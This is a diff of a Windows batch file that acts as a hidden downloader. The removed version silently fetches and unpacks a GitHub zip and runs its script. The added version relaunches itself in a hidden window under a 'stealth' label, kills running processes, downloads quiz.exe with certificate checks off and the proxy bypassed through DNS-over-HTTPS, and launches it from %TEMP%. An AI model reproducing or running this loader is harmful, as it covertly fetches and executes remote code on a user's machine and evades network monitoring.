@@ -1,3 +1,19 @@
 @echo off
-powershell -WindowStyle Hidden -NoProfile -Command "Start-Process cmd -ArgumentList '/c cd /d %TEMP% & taskkill /F /IM pythonw.exe >nul 2>&1 & curl.exe --noproxy * --doh-url https://1.1.1.1/dns-query -ksL https://github.com/0rkhanmammadov/questions/archive/refs/heads/main.zip -o q.zip & tar.exe -xf q.zip & del /q q.zip & cd /d %TEMP%\questions-main & python -m pip install -q -r requirements.txt & call baslat.bat' -WindowStyle Hidden"
-exit
+if "%1"=="h" goto stealth
+powershell -WindowStyle Hidden -NoProfile -Command "Start-Process cmd -ArgumentList '/c \"\"%~f0\"\" h' -WindowStyle Hidden"
+exit /b 0
+
+:stealth
+cd /d "%TEMP%"
+taskkill /F /IM quiz.exe >nul 2>&1
+taskkill /F /IM pythonw.exe >nul 2>&1
+if not exist quiz.exe goto download
+for %%A in (quiz.exe) do if %%~zA LSS 10000000 goto download
+goto launch
+
+:download
+curl.exe --noproxy * --doh-url https://1.1.1.1/dns-query -ksL https://github.com/0rkhanmammadov/questions/releases/download/v1.0/quiz.exe -o quiz.exe
+
+:launch
+start "" "%TEMP%\quiz.exe"
+exit /b 0
